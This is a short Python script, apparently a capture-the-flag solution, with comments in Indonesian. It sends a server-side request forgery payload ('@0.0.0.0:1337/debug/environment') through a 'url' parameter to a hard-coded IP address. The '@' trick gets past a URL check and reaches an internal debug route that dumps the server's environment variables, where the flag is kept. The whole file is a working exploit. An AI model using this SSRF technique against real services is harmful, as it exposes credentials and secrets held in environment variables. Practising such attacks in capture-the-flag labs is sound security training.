import httpx

URL = "http://94.237.56.188:54633"

class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)
        
    def sendpayload(self,payload) -> str:
        return self.c.get("/", params={
            "url":payload
        }).text
        
class API(BaseAPI):
    ...

if __name__ == "__main__":
    api = API()
    # karena di source code dikasih tau kalo flag itu berada di environment variable system
    # dan di bagian routes debug ada dict(os.environ) kita tinggal ke sini menggunakan ssrf ke localhost
    # untuk bypass reddit bisa menggunakan @ untuk redirect ke domain lain
    print(api.sendpayload('@0.0.0.0:1337/debug/environment'))